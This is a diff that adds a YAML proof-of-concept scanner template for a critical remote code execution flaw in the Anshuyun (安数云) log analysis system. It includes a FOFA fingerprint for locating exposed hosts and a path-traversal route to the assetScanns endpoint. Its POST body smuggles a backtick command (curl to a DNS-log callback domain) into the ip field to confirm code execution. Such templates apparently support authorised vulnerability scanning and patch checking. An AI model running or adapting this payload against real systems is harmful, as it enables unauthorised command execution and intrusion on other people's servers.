@@ -1,0 +1,21 @@
+id: poc-yaml-datacloudsec-clas-assetscanns-rce
+info:
+  name: 安数云综合日志分析系统 assetScanns 远程代码执行漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - rce
+  finger: 安数云综合日志分析系统
+  fofa: icon_hash="-2008445303"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /js/..;/assetTopo/assetScanns
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: ip=127.0.0.1`curl {{.domain}}`&port=8083
+  expression: status_code == 200 && contains(body,"\"message\":") && contains(body,"\"status\":")
+    && contains(content_type,"application/json") && reverse.Verify()
+transport: http
